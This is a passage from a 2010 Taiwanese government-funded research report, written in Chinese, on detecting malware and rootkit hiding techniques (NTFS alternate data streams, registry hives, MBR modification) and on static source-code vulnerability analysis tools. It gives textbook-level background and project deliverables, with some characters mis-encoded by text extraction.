 1 
 
行政院國家科學委員會補助專題研究計畫
■ 成 果 報 告   
□期中進度報告 
 
資訊產品安全檢測技術整合型研究案 
 
 
計畫類別：□ 個別型計畫  ■整合型計畫 
計畫編號： 
執行期間：  2010 年 1 月 1 日至 2010 年 12 月 31 日 
 
計畫主持人：謝續帄教授 
共同主持人：游逸帄助理教授 
計畫參與人員：王繼偉、蔡羽軒、田璨榮、李秉翰、許家維、朱信儒、王嘉偉、
朱慶峰、劉芳瑜、卓政逸、宋穎昌、施汎勳、游釗俊、蘇修醇、江孟寰、劉晏如、
鍾佳妤、曾子建、李介豪、饒彥章、馬志舜 
 
成果報告類型(依經費核定清單規定繳交)：□精簡報告  ■完整報告 
 
本成果報告包括以下應繳交之附件： 
□赴國外出差或研習心得報告一份 
□赴大陸地區出差或研習心得報告一份 
□出席國際學術會議心得報告及發表之論文各一份 
□國際合作研究計畫國外研究報告書一份 
 
處理方式：除產學合作研究計畫、提升產業技術及人才培育研究計畫、列管計畫
及下列情形者外，得立即公開查詢 
          □涉及專利或其他智慧財產權，□一年□二年後可公開查詢 
 
執行單位： 
 
中華民國   2010 年  12   月 21  日 
 3 
 
範疇。在實作部分來看，原始碼漏洞分析以靜態分析為主要之手法，原始碼中
保留較多的資訊，而如何整理歸納這些資訊成為一個撰寫程式的規範，來協助
開發者和使用者復原修改其原始碼以達到程式安全之目標。而惡意程式行為分
析則利用動態分析來獲得資訊，由於編譯過的二進位檔少了許多抽象化的物件
資訊，如何利用靜態分析與動態分析達到互相補足其缺陷，將是本計劃的重點
之一。 
為了達到目標（一），本計劃將研究如何取出所有檔案相關的資訊以提供使
用者參考。去年的研究成果已完成了針對二進位的可執行檔，透過虛擬機器內
外部分析的方式，找出其侵入行為與隱藏行為。但由於並非所有檔案皆可以被
執行。在今年度，本研究計畫加上了對普通檔案文件的分析方法。由於普通文
件無法直接利用去年成果之分析手法來獲得相關行為資訊，故開發了檔案文件
分析系統來互補與加強分析範圍。由於惡意文件檔案可能利用應用程式漏洞來
取得執行控制權，進一步入侵作業系統。但要模擬市面上全部有漏洞的應用程
式是一件極不可能達到的事情，所以，我們將針對檔案內所包含的字串、載入
的系統函式、資訊熵以及利用 x86 模擬器來偵測是否有偵測記憶體位置之行為，
來達到此目標。此方式結合了靜態與動態分析的技術，提供鑑識人員一些辨識
的依據。 
在滿足目標（二）的部分，去年度已完成一原始碼漏洞分析系統，並且利
用國際知名之效能評估樣本來評估本系統。為了能夠客製化和快速地實作出該
系統，我們結合了目前的商業軟體 Fortify SCA，藉著添加自訂安全規則，並使
 5 
 
2 目錄 
2.1 總目錄 
 
1 摘要 ............................................................................................ 2 
2 目錄 ............................................................................................ 5 
2.1 總目錄. ............................................... 5 
2.2 圖目錄. ............................................... 8 
2.3 表目錄. .............................................. 15 
3 計畫簡介 ................................................................................... 18 
3.1 計畫緣起 ............................................. 18 
3.2 計畫時程(甘特圖) ..................................... 19 
3.3 計畫目標 ............................................. 21 
3.4 計畫內容（含工作項目） ............................... 22 
3.5 計畫成果 ............................................. 24 
4 執行概要 ................................................................................... 28 
4.1 研究背景簡介 ......................................... 28 
4.1.1 檔案隱藏 .......................................................................................... 29 
4.1.2 登錄機碼隱藏 .................................................................................. 32 
4.1.3 MBR 磁區修改 ................................................................................. 47 
4.1.4 SSDT Hooking .................................................................................... 61 
4.1.5 IDT .................................................................................................... 72 
4.1.6 可執行檔檔格式解析 ...................................................................... 85 
 7 
 
4.1.38 Microsoft Visual Basic Buffer Overflow (VB.NET) ............................ 228 
4.1.39 Microsoft Visual Basic T-SQL Object Buffer Overflow (VB.NET) ....... 229 
4.2 研究架構及方法 ...................................... 230 
4.2.1 檔案隱藏 ........................................................................................ 234 
4.2.2 登錄機碼隱藏 ................................................................................ 236 
4.2.3 MBR 磁區修改 ............................................................................... 254 
4.2.1 SSDT Hooking .................................................................................. 257 
4.2.2 IDT Hooking .................................................................................... 268 
4.2.3 文件檔隱藏 Shellcode .................................................................... 270 
4.2.4 原始碼靜態分析模式 .................................................................... 278 
4.2.5 原始碼靜態分析相關議題 ............................................................. 282 
4.2.6 原始碼靜態分析整合帄台 ............................................................. 284 
4.2.7 工具回報準確率與危險層級評估 ................................................. 287 
4.2.8 原始碼整合分析工具－各項工具介紹 ......................................... 289 
4.3 實驗設計(或模擬設計)及實作 .......................... 296 
4.3.1 文件檔案測詴結果報告 ................................................................. 301 
4.3.2 惡意程式樣本測詴結果報告 ......................................................... 317 
4.3.3 原始碼靜態分析工具 - 效能評估 ................................................ 339 
4.3.4 原始碼靜態分析工具－回報準確率評估 ..................................... 355 
5 結論與建議 ............................................................................. 358 
6 參考文獻 ................................................................................. 361 
7 附錄 A-惡意帄台分析安裝及操作手冊 ................................ 367 
8. 附錄 B –整合原始碼分析工具安裝及操作手冊 .................. 384 
 
  
 9 
 
圖表4-12開機管理程式安裝在 MBR、開機磁區與作業系統的關係(引自
於HTTP://LINUX.VBIRD.ORG/LINUX_BASIC/0510OSLOADER.PHP圖1.2.1) 57 
圖表4-13開機管理程式的選單功能與控制權轉交功能示意圖(引自於H
TTP://LINUX.VBIRD.ORG/LINUX_BASIC/0510OSLOADER.PHP圖1.2.2) .. 58 
圖表4-14PROTECTION RING LEVEL與受保護的層級圖(圖表引用自: HTTP:/
/EN.WIKIPEDIA.ORG/WIKI/RING_(COMPUTER_SECURITY)) ............ 62 
圖表4-15簡化後的WINDOWS NT ARCHITECTURE 簡圖(引用自:HTTP://TECHNET.
MICROSOFT.COM/EN-US/LIBRARY/CC768129.ASPX) ................ 63 
圖表4-16WIN32 SUBSYSTEM 與NATIVE API之間的相依關係(引用自: UNDOC
UMENTED WINDOWS 2000 SECRETS CHAP2 FIGURE 2-1 P.96) ........ 64 
圖表4-17DEVICEIOCONTROL() 透過INT 2EH 呼叫NTDEVICEIOCONTROL() (圖
表引用自UNDOCUMENTEDWINDOWS 2000 SECRETS CHAP2 EXAMPLE 2-1 P.97)
 .... 64 
圖表4-18SYSTEM SERVICE DESCRIPTOR TABLE結構(引用自: UNDOCUMENTED WIN
DOWS 2000 SECRETS CHAP5 FIGURE 5-1 P.267) ................ 66 
圖表4-19SYSTEM SERVICE DESCRIPTOR與SYSTEM SERVICE TABLE結構(引用自: 
UNDOCUMENTED WINDOWS 2000 SECRETS CHAP5 LISTING 5-1 P.268) .. 66 
圖表4-20ZW PREFIX FUNCTION內容(圖表引用自UNDOCUMENTED WINDOWS 2000 
SECRETS CHAP2 EXAMPLE 2-1 P.97) ......................... 69 
 11 
 
32 ARCHITECTURES SOFTWARE DEVELOPER’S MANUAL VOLUME 3A: SYSTEM PR
OGRAMMING GUIDE, PART 1 ,FIGURE 6-1) ...................... 79 
圖表4-30IDTR中LIMIT和BASE與IDT的對應及IDT VECTOR的內容解析(圖表
引用自: HTTP://LODA.HALA01.COM/2009/04/LINUX圖(五),X86 IDT架
構) . 81 
圖表4-31前32個INTERRUPT VECTOR的用途 (圖表引用自: HTTP://EN.WIKIP
EDIA.ORG/WIKI/INTERRUPT_DESCRIPTOR_TABLE) .................. 82 
圖表 4-32PE文件的結構 .................................... 86 
圖表 4-33 載入函式呼叫流程 ............................... 95 
圖表 4-34 重新寫入載入函式位址 .......................... 101 
圖表 4-35 資訊熵的分部曲線圖 ............................ 104 
圖表4-36公司尾牙抽獎的階層式機率事件 .................... 107 
圖表4-37公司尾牙抽獎的直接式機率事件 .................... 107 
圖表 4-38 NOTEPAD.EXE的每一個BYTE值出現頻率 ............... 114 
圖表 4-39NOTEPAD.EXE篩選過大值(00跟FF)的比較 .............. 114 
圖表 4-40 ROBERT LYDA, JAMES HAMROCK 統計出來檔案類型的資訊熵
 ... 115 
圖表 4-41錯誤顯示圖 ..................................... 203 
圖表 4-42安全漏洞程式碼 ................................. 218 
 13 
 
圖表4-60USER-MODE程式 PART1 ............................... 263 
圖表4-61USER-MODE程式 PART2 ............................... 264 
圖表4-62USER-MODE程式 PART3 ............................... 265 
圖表4-63RETRSSDT WORKFLOW ................................. 266 
圖表4-64  DUMPING THE IDT WORK FLOW ......................... 268 
圖表4-65檔案文件檢測流程圖 .............................. 270 
圖表 4-66FSA MODEL ....................................... 281 
圖表 4-67系統架構圖 ..................................... 285 
圖表 4-68分析帄台介面 ................................... 286 
圖表 4-69分析帄台書面報表 ............................... 286 
圖表 4-70 檔案檢測系統開機 .............................. 296 
圖表 4-71 使用選項 ...................................... 297 
圖表 4-72 檔案檢測系統使用者介面 ........................ 297 
圖表 4-73 檔案檢測系統結果報告說明 ...................... 298 
圖表 4-74對目錄進行處理的DIRFORENSER.SH的使用方法 ......... 299 
圖表 4-75檔案檢測系統執行結果 ........................... 300 
圖表4-76選擇"START_MBA.SH"開始執行分析程式。 ............. 314 
圖表4-77選擇在"終端機"執行該分析程式。 .................. 314 
圖表4-78選擇檔案按鈕。 .................................. 315 
 15 
 
2.2 表目錄 
表格 3-1年進度甘特圖 ..................................... 19 
表格 4-1WINDOWS主要登錄機碼目錄名稱 ....................... 34 
表格 4-2登錄機碼實際存放位置(HIVE檔) ...................... 35 
表格 4-3本機登錄機碼主要子目錄 ........................... 36 
表格 4-4HKEY_USERS中各SUBKEY簡介 .......................... 36 
表格 4-5HKEY_CURRENT_USER 底下各子目錄簡介 ............... 37 
表格 4-6標準的MBR結構 .................................... 49 
表格 4-7主要分割及延伸分割數量組合 ....................... 51 
表格 4-8硬碟分割結構資訊 ................................. 51 
表格 4-9CPU中的SEGMENT REGISTER ............................. 78 
表格 4-10IMAGE_FILE_HEADER FILEHEADER的名稱與意義對照表 .... 88 
表格 4-11IMAGE_OPTIONAL_HEADER介紹 ....................... 88 
表格 4-12 PE SECTION的介紹 ................................ 90 
表格 4-13IMAGE_DATA_DIRECTORY 結構陣列 ................... 96 
表格 4-14每年新增安全漏洞數量 ........................... 197 
表格 4-15資安漏洞統計分類 ............................... 197 
表格 4-16FXCOP對.NET安全性議題 .......................... 291 
表格 4-17 FORTIFY SCA檢測SAMATE GOOD CASE結果 .............. 341 
 17 
 
表格 4-37VB.NET語言工具回報準確率結果 ................... 356 
表格 4-38 C語言工具回報準確率結果 ....................... 356 
 
  
 19 
 
使用產出之分析系統，實際分析惡意程式與駭客攻擊，因此將可對現今新型態
的網路攻擊或惡意程式技術有深刻的認知了解，提升其資訊安全維護概念。目
前資訊人員在資訊安全的概念培養仍嫌不足，許多資安事件並非因軟硬體上的
漏洞導致，而歸因於使用人員的大意疏忽，因此參與人員的資安意識提升，亦
在資安維護中佔同樣重要成分。此外，由於進行軟體原始碼漏洞分析時，過程
中將用到許多軟體開發中的安全規則，因此開發人員將可培養出完善的程式安
全設計理念。 
3.2 計畫時程(甘特圖) 
依據計畫時程，偵測文件類型檔案項目已順利在六月完成，將會有一份技
術報告繳交。剩下未完成之項目將會在下半年內完成。詳細實際執行時程甘特
圖如下： 
表格 3-1 年進度甘特圖 
工作項目 1 
月 
2 
月 
3 
月 
4 
月 
5 
月 
6 
月 
7 
月 
8 
月 
9 
月 
10月 11月 12
月 
檔案系統修改偵測 
            
 
 
      
      
修改 MBR 
            
 
 
      
      
Registry 檔修改偵測 
          
 
 
 
 
 
 
 
 
         
         
系統核心結構修改偵測 
          
 
 
 
 
 
 
         
         
 21 
 
3.3 計畫目標 
本資訊產品安全檢測技術整合型研究案(以下簡稱本研究案)為第二年度延
續性計畫。本計畫著重兩大目標：（一）本系統對資安人員在面對未知的檔案目
標進行鑑識判別時，將能有效的提供判斷依據。（二）尋找軟體原始碼中的漏洞，
以期軟體開發人員在設計過程中能及早發現漏洞加以更正。為了達成目標（一），
我們將實作出一未知惡意程式之入侵行為的分析系統，亦即由使用者輸入一待
檢測的目標檔案至系統後，本系統將自動進行分析出該目標對系統進行的隱藏
行為，例如程序模組隱藏、檔案隱藏或登錄機碼隱藏等等，並以這些資訊判別
該目標檔案是否為 Rootkit 程式。針對目標（二），此計畫使用靜態程式檢測工
具－Fortify，搭配相關 Shareware、Freeware，利用其不同的靜態分析檢驗方式
來彌補 Fortify SCA 相關檢測的不足。除了第一年度所提出的 C/C++/PHP 軟體原
始碼中的可能漏洞，本年度會加上 JAVA 與 VB .Net 的原始碼檢測，讓整體檢測
範圍更加全面。並提出 JAVA 與 VB .Net 的安全程式設計原則，使軟體開發人員
能在程式開發階段找出程式漏洞，並加以統整與修改，進而解少相對應之損失。
因此本報告於下兩章節分別列舉出兩大目標的相關背景、研究方法、執行概要、
研究成果，並在最後附上結論與參考文獻。 
 
  
 23 
 
藏之 Shellcode 攻擊」，此五大實作目標。目前已全數完成，並且有兩大系統產
出：一）惡意文件檢測系統、二）惡意軟體程式分析帄台。 
B. 軟體原始碼漏洞分析 
根據 Tsipenyuk 等人所提出的 Seven Pernicious Kingdoms 做分類，分析探討
各種程式安全漏洞發生原因、運作方式，分為 Java 與 VB.NET 二大方向各自探
討。 
“不安全程式設計與入侵方法之案例蒐集與研析”這部分，目前整理數個已知
開放原始碼軟體漏洞，進行漏洞原因、攻擊手法探討。 
“不安全 Java/VB.NET 原始碼檢測工具雛形原始碼檢測工具雛形”方面，探
討靜態分析問題本身的不可預測(undecidable)性質，而指出分析工具能力限制，
及可改進的方向。對於數個開放原始碼或免費工具和 Fortify SCA 相互比較分析
方法、適用範圍。蒐集了數個測詴程式集 (benchmark)，對其進行初步檢測，以
了解各項工具的能力與限制點。 
以上三項分別對應計畫書中列舉之「Java 安全程式設計原則與實務」、
「VB.NET 安全程式設計原則與實務」、「不安全 Java 原始碼檢測工具雛型」、「不
安全 VB.NET 原始碼檢測工具雛型」、「不安全 Java 程式設計與入侵方法之案例
蒐集與研析」、「不安全 Java 程式設計與入侵方法之案例蒐集與研析」等六大要
點，進度均按計畫時程進行。 
 25 
 
5. 檔案文件檢測系統一份 
6. 檔案文件檢測系統安裝及操作手冊一份 
7. 與程式碼漏洞分析整合之期末報告一份 
8. 動態惡意程式行為分析帄台 LiveCD 一片 
9. 動態惡意程式行為分析帄台安裝及操作手冊一份 
在 Java/VB.NET 軟體原始碼漏洞分析部分，計畫工作項目主要以建立整合
分析介面為主，支援 C/C++/PHP /Java/VB.NET 等程式原始碼，並撰寫整合工具
使用手冊，系統設計報告，對於相關工具也會撰寫測詴報告。入侵方法案例方
面，會持續蒐集 Java/VB.NET 相關案例，整理弱點原因、攻擊手法等等，以書
面報告呈現。至計畫結束時，已完成以上各項目。提供一套整合靜態分析工具
帄台，供使用者進行程式安全分析，及早在軟體開發階段找出潛在程式安全漏
洞，增加軟體可靠度 (reliability)與降低維護成本。以下為條列交付項目： 
 開發靜態程式碼漏洞分析帄台包含下列功能 
1. 檢測功能 
2. C 語言單一檔案檢測 
3. C 語言批次檢測 
4. C++單一檔案檢測 
5. C++批次檢測 
6. PHP 單一檔案檢測 
7. PHP 批次檢測 
 27 
 
9. 與惡意程式分析整合之期末報告一份 
10. 整合分析帄台程式原始碼 
除了上述兩大系統的交付項目之外，本計畫已經在 2010 年 12 月 20 的上午
於中山科學研究院進行技術移轉，把兩大系統「惡意程式行為分析帄台」、「靜
態程式碼漏洞分析帄台」安裝於院內的機器上。同日下午，也在會議室內進行
期末展示，讓中山科學研究院的長官們給予建議指導，討論十分熱烈。而本校
參與研究計畫之同學們也獲益良多，日後將會繼續朝著建議方向深入地研究探
討。 
  
 29 
 
的行為提出了分析偵測的方法，在 99 年度中我們將繼續對其餘的惡意程式行為
進行延伸研究。以下將對 99 年度中預期分析的惡意程式行為進行分類介紹。 
4.1.1 檔案隱藏 
惡意程式可能使用NTFS檔案系統的ADS功能來隱藏自身的存在。ADS全名
Alternate data streams，其起源必頇先追至Macintosh作業系統，Mac OS所採用的
檔案系統其檔案皆沒有副檔名的概念，然而系統卻可以正確的去判別該檔案的
擁有者以及是否可執行等屬性。這是由於每個檔案都有兩個fork。其一為resource 
fork，紀錄著該檔案上述的各種屬性。另一為data fork，紀錄真正的檔案內容。
微軟作業系統發展至Windows NT 3.1時，期望與AppleTalk相容互通，讓兩方的
使用者能夠輕易的交換彼此資料。但由於Mac OS檔案的resource fork存在另一獨
立的資料流中，直接複製Mac OS端之檔案至Windows端僅有檔案的data fork會被
複製而缺乏紀錄該檔案眾多屬性的resource fork。因此微軟實做了於NTFS檔案系
統上相容resource fork以及data fork之機制，即是為了相容Mac OS所採用的
HFS(Hierarchical File System)以提供SFM(Service For Macintosh)的ADS。 
如此一來Windows NT也可以看見Mac OS上檔案的resource fork，並於複製檔
案時將resource fork以及data fork一併複製至Windows NT系統。然而由於該實做
為相當底層的作業系統核心修改，多數系統API以及程式皆無法得知ADS的存在，
因此ADS的使用起初並不盛行。 
Windows NT 4 至 Windows 2000 時期，sparse file、多媒體檔案之總和資
 31 
 
圖表 4-1Windows ADS 內容顯示 
 
目前的 Windows Server 版本已不再包含 SFM，僅剩下少數第三方的軟體仍
在使用 NTFS的 ADS特色。多媒體播放軟體也改採用獨立的資料庫來儲存上述資
料，ADS因而逐漸沒落。多數使用者也因為極少接觸而不知其存在。然而在 NTFS
成為 Windows主流檔案系統，且眾多使用者未知 ADS存在的狀況下，ADS逐漸成
為惡意軟體隱藏自身的手段之一，其所能附加的資料流可以是各種檔案類型。
其中固然也包括了可執行檔.exe，使得惡意程式得以將自身隱藏於 ADS 中，若
非透過特殊的掃描工具，使用者難以察覺其存在。 
在 NTFS 的檔案系統裡，ADS 可以被用來隱藏檔案，被隱藏的檔案將不會顯
示在資料夾的檔案目錄裡，且其大小不能被更改。ADS亦經常被合法運用於儲存
即時性的資料與一系列追蹤的紀錄。可被 ADS 隱藏的檔案大小並沒有限制，而
ADS只要輸入一行 DOS指令即可輕鬆產生。 
現今 ADS的存在仍然是鮮為人知。ADS已被安全領域社群，當作惡意的個體
討論一段時日了。當任何有利於駭客惡意行為的議題或是方法被提出，都會很
快的被駭客不肖運用。駭客應用 ADS 執行惡意行為已成為不可抵擋的趨勢，甚
至有些惡意程式會使用 ADS將自己隱藏起來，不讓管理者監測到。   
 33 
 
一般人直覺上會認為，所有的登錄檔是儲存在一個檔案裡面，這個檔案裡就
包含了所有的登錄檔資料。在早期 Windows 3.x 系統上確實是以這種方式儲存。
然後在 Windows 95之後，就開始採用將登錄檔分散儲存在多個檔案裡面的方式，
而這些檔案則被稱為 hive。 
那麼為什麼在 regedit 中檢視時，顯示出來的會是一個完整的 Tree 的架構呢？
UNIX的使用者可以用UNIX的檔案系統架構來想像：regedit會先虛擬出一個 tree 
root，接著把分散在各個檔案的 Registry 資訊一個一個 mount 上來，最後就變成
了我們在 regedit 看到的 Registry 架構。至於實際的做法則是透過類似捷徑的方
式將各個檔案連起來，讓使用者可以很方便的存取。 
圖表 4-2Windows 登錄機碼截圖 
 
接著看看上圖 regedit 的開啟時的情況，看到這張圖再配上之前提到的架構，也
許會認為目前登錄檔的架構就是儲存在 5 個檔案裡面，由 regedit 將他們連接起
來。事實上並不是這樣，例如 HKEY_CURRENT_USER 並不是一個檔案，只是連接
到 HKEY_USERS 中有關目前登入的使用者設定的一個捷徑。也就是說 regedit 顯
 35 
 
HKEY_LOCAL_MACHINE 和 HKEY_USERS 兩個是真正的分支，其他都只
是連接到他們中的某個部分的一個捷徑。 
各 hive 存放的路徑如下： 
表格 4-2 登錄機碼實際存放位置(hive 檔) 
HKEY_LOCAL_MACHINE\SYSTEM \WINDOWS\system32\config\system 
HKEY_LOCAL_MACHINE\SAM \WINDOWS\system32\config\sam 
HKEY_LOCAL_MACHINE\SECURITY \WINDOWS\system32\config\security 
HKEY_LOCAL_MACHINE\SOFTWARE \WINDOWS\system32\config\software 
HKEY_LOCAL_MACHINE\HAREWARE 不存在。 Volatile hive 
HKEY_LOCAL_MACHINE\SYSTEM\Clone 不存在。 Volatile hive 
HKEY_USERS.DEFAULT \WINDOWS\system32\config\default 
HKEY_LOCAL_MACHINE 
這個分支中包含了電腦上會影響到所有使用者的設定，例如驅動程式和安全
性管理原則等。在其下有五個 subkey，在此簡述他們的功用： 
  
 37 
 
HKEY_USERS\{SID}，內容包含了環境變數、桌面設定、網路、印表機及應用
程式等設定。其下包含的各項目分別簡述如下： 
表格 4-5HKEY_CURRENT_USER 底下各子目錄簡介 
AppEvents 與事件相關聯的音效，例如登出 Windows XP、縮小視窗等。 
Console 有關命令提示字元的相關設定。 
Control Panel 在控制台中的大部分設定都可以在此找到，也包含了一些在控制台中沒有
出現的設定可在此手動設定。 
Environment 使用者的環境變數。 
Identities Outlook Express 中每個使用者的身分。 
Keyboard Layout 鍵盤的設定資訊。 
Network 儲存網路驅動程式。 
Printers 使用者對印表機的個人偏好設定。 
Software 使用者對應用程式的個人偏好設定。 
Volatile 
Environment 
當使用者登入時定義的環境變數。 
HKEY_CLASSES_ROOT 
這個登錄的內容是由 HKEY_LOCAL_MACHINE\SOFTWARE\Classes 及
HKEY_CURRENT_USER\Software\Classes 兩者合併而成。若兩者有重複的內容，
會以 HKEY_CURRENT_USER 中的為優先。藉由這樣的方式，可以讓一台電腦
上的多個使用者互相分享檔案關聯的設定，並且當重複時會以自己的優先，不
會受到其他使用者的影響。 
HKEY_CURRENT_CONFIG 
連 結 到 儲 存 目 前 硬 體 資 訊 的
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware\Profiles\Current。內
容包含螢幕字型及解析度，以及隨插即用及目前可用的印表機的資訊。 
 39 
 
• Value-list cell 
• Security-descriptor cell (SK) 
上面提到的 subkey-list，是因為一個 key可以有多個 subkey，因此該 key的 key cell
會指向一個 subkey-list cell，裡面記錄了該 key 全部的 subkey 的位置(即他們的
key cell 的位置)，藉此來將 key 和多個 subkey 連在一起。Value-list 也是一樣的
形式。有關這些 cell 的詳細資料會在之後介紹。 
接下來回到 bin，bin 是 hive 扣掉 base block 後的其他區塊，也就是真正存放
登錄資料的地方。前面提過在 hive 中所有的資料都被儲存在 cell 中，因此 bin
其實就是一個內部包含了許多 cell 的一個資料結構。 
  
 41 
 
當新增 cell 時則是尋找有沒有空的空間可以放進去，如果發現目前的 bin 已
經無法容納時，就新增一個 bin，大小為 4096 bytes 的倍數。由於登錄機碼常常
會進行新增和刪除，因此一次 allocate 4096 bytes 可以不用每次新增時都去做
allocate的動作及一直調整 hive file的大小，直接對已經分配好的空間進行存取，
可以增進效率。 
前面提過，cell 根據儲存的資料的不同，可以分為以下幾種：Key cell、Value 
cell、subkey-list cell、value-list cell 以及 security-descriptor cell 幾種。如下圖所示： 
圖表 4-5 以實際在 regedit 中看到的狀況 
 
在這張圖中，SOFTWARE 就是 key，7-Zip 則是他的 subkey，而 Path 則是 7-Zip
中的一個 value 的名字，而 value 的 data 則是 D:\Tool\7-Zip。若以圖形來表示其
結構則是這樣： 
 43 
 
• Security-descriptor cell 的 index 
• 自己(key)的名字 
 
※ Subkey-list cell 
包含了屬於同個 parent key 的所有 subkey 的 key cell 的 index 
 
※ Value cell 
• Signature 
• Value 的名字 
• Value 的型態 
• 存放 data 的 cell 的位置 
註：若 value 的長度小於 4 bytes，那麼 data 會直接存在本來放「儲存 data
的 cell 的位置」的位置，而不會再用一個 cell 來存值。即本來存放 cell index
的地方現在直接存 data。 
 
※ value-list cell 
包含了屬於同個 key 的所有 value 的 value cell 的 index 
※ security-descriptor cell 
Signature 
記錄了有多少 key 共用這個 security descriptor 的 reference counter  
 45 
 
存放相依於 lib/libhive.c 的程式碼。這邊定義了一些存取登錄機碼的方式，
利用登錄機碼的 Key-Value 結構來實現一些功能。並不是針對其低階的二進位結
構作存取。 
nstdreg.h/.c 
提供了一個介面來供程式設計師使用，其定義了函式為 POSIX-like。作者認
為 windows 提供的函式不夠好，故自行定義了一些函式名稱來取代原有的
Windows 函式。 
sam.h/.c 
提供存取 Security Accounts Manager data (SAM)，取得使用者列表，創造使
用者，改變密碼等。 
hivetool/bin 資料夾 
這個資料夾包含了所有可執行的檔案，我們可以利用這資料夾內的內容來存
取 windows 機碼。而其中 listhive 則是本計劃用來取出登錄檔資訊的檔案。 
hivetool/misc 資料夾 
其他的輔助套件。類似幫助印出除錯資訊，偵錯函式等。 
利用上述的套件，我們開發出一 bin/listhive，並可以解析一個 windows 登錄碼
的檔案，並且提供修改，讀取，設定等動作。 
 47 
 
4.1.3 MBR 磁區修改 
MBR rootkit 透過載入自己的檔案系統驅動程式，做硬碟檔案的讀寫控制，
把想要修改的二進位檔，寫入開機磁區之中。由於有些防毒軟體為了保護開機
磁區，會定期備份並且還原。MBR rootkit 能針對要求的檔案名稱，回傳未被修
改的內容以躲避防毒軟體的偵測。而此技術也可以運於隱藏檔案；在 I/O 部分，
rootkit 也可以做鍵盤的側錄，把蒐集到的敲鍵值寫到檔案中。針對 rootkit 對 MBR
攻擊舉例來說，IBM PC 第一支被正式記載的病毒名叫 Brain，採用 hook IDT 0x13
的方法感染 MBR 做破壞。 
(a) MBR 介紹 
開機磁區(boot sector)是硬碟、軟碟或類似資料儲存裝置的一個磁區，內含負
責啟動「存放在硬碟其它部份的程式」的 machine code。其中，開機磁區有兩種： 
一、 Volume Boot Record(VBR) 
VBR 又稱 volume boot sector 或 partition boot sector，是一種開機磁區，儲
存在硬碟或軟碟上的 disc volume、或資料儲存設備上，且含有用來 boot
的程式碼；在未分割的儲存設備上，它是設備的第一個磁區；而在已分割
的設備上，它是設備上各個 partition 的第一個磁區，而整個 device 的第一
個磁區為 MBR。也就是說，VBR 是磁碟未被分割的第一個磁區，或已分
割的 partition 的第一個磁區，包含了載入與喚起作業系統(放在這個分區之
內或放在這個磁碟上)的程式碼。 
 49 
 
 在電腦的 BIOS 通過在 MBR 中 machine code instruction 的執行後，開機。 
 利用 32-bit 的 disk signature 來唯一性地辦認個別的 disk media，雖然硬碟在
running 時可能不會用到。 
MBR 記錄著硬碟本身的相關資訊以及硬碟各個分割的大小及位置資訊，是
資料資訊的重要入口。如果受到破壞，硬碟上的基本資料結構資訊將會遺失，
需要利用很繁瑣的方式詴探性快重建資料結構資訊後才可能重新存取原先的資
料。MBR 內的資訊是透過 FDISK 寫入的，是低階格式化的產物，和作業系統沒
有任何關聯。相對而言，作業系統是建立在高階格式化的硬碟分割之上，是和
一定的檔案系統相聯繫的。 
表格 4-6 標準的 MBR 結構 
位址 
描述 長度（BYTE） 
Hex Oct Dec 
0000 0000 0 代碼區 440(最大 446) 
01B8 0670 440 選用磁碟標誌 4 
01BC 0674 444 一般為空值; 0x0000 2 
01BE 0676 446 
標準 MBR 分割表規劃 
(四個 16 byte 的主分割表入口) 
64 
01FE 0776 510 55h MBR 有效標誌: 
0xAA55 
2 
01FF 0777 511 AAh 
MBR, 總大小: 446 + 64 + 2 = 512 
在 Boot code 部份的內容會因磁碟分割工具的不同而有所不同，但大小絕對不會
超過 446 Bytes，而且程式碼最後的目的都是一樣的。當電腦開機完成硬體的
POST（Power On Self Test）後，BIOS 會將開機硬碟之 MBR 中的 Boot code 載
至 memory 中執行，Boot code 是一讀取硬碟分割表的小程式，會從硬碟分割表
 51 
 
圖表 4-7 硬碟分割表(partition table)結構圖(引用自 http://www.msservermag.com.tw/technicwords/020829.aspx) 
 
由於每個分割資訊需要 16個 bytes，所以對於採用MBR型分割結構的硬碟，
最多只能有 4 個主要分割（primary partition），若要得到 4 個以上的主要分割是
不可能的；為解決分割區數量的限制，便將分割區的種類分成主要分割及延伸
分割（extend partition），且主要分割和延伸分割的數量加起來不能超過四個，其
中，延伸分割也是主要分割的一種，但我們並無法直接使用延伸分割，必頇把
它再分成幾個邏輯分割（logical partition）才能用來存放資料，也就是說它與主
要分割的不同在於理論上可以劃分為無數個邏輯分割。 
表格 4-7 主要分割及延伸分割數量組合 
Primary partition 數量 1 2 3 1 2 3 4 
Extend Partition 數量 1 1 1 0 0 0 0 
表格 4-8 硬碟分割結構資訊 
偏移 長度(位元組) 意義 
 53 
 
圖表 4-8 延伸硬碟分割表（Extend partition table）結構圖(引用自
http://www.msservermag.com.tw/technicwords/020829.aspx) 
 
邏輯分割區域之起始位置及結束位置的相關資訊則記載在每個邏輯分割的
第一個磁區，該磁區的資料結構圖如圖（和 MBR 的結構很類似）： 
圖表 4-9 邏輯分割第一個磁區的資料結構圖(引用自 http://www.msservermag.com.tw/technicwords/020829.aspx) 
 
最後，以一個硬碟切割了 3 個主要分割和 1 個延伸分割，延伸分割又切割
了 3 個邏輯分割為例，示意圖如下： 
 55 
 
(c) 硬碟分割注意要點 
Windows 系統預設情況下，一般都是只劃分一個主要分割給系統，剩餘的部
分全部劃入延伸分割。這裡有下面幾點需要注意： 
 在 MBR 分割表中最多 4 個主分割或者 3 個主分割＋1 個延伸分割，也就是
說延伸分割只能有一個，然後可以再細分為多個邏輯分割。 
 在 Linux 系統中，硬碟分割命名為 sda1－sda4 或者 hda1－hda4（其中 a 表示
硬碟編號可能是 a、b、c 等等）。在 MBR 硬碟中，分割號 1－4 是主分割（或
者延伸分割），邏輯分割編號只能從 5 開始。 
 在 MBR 分割表中，一個分割最大的容量為 2T，且每個分割的起始柱面必頇
在這個硬碟的前 2T 內；若有一個 3T 的硬碟，根據要求，至少要把它劃分
為 2 個分割區，且最後一個分割的起始磁區需位於硬碟的前 2T 空間內。 
系統開機或重開機 MBR 的讀取流程 
1. 開機後，BIOS 開始測詴電腦硬體及周邊設備，再來執行內部記憶體位址為
FFFF:0000H 處的跳轉指令，跳轉到固化在 ROM 中的自檢程式處，對系統
硬體(包括內部記憶體)進行檢查。 
2. 讀取 MBR。當 BIOS 檢查到硬體正常並與 CMOS 中的設定相符後，按照
CMOS 中對啟動裝置的設定順序檢測可用的啟動裝置；BIOS 將相應啟動裝
置的 MBR 磁區讀入內部記憶體位址為 0000:7C00H 處。 
3. 檢查 0000:7DFEH-0000:7DFFH(MBR 的結束標誌位)是否等於 AA55H，若不
 57 
 
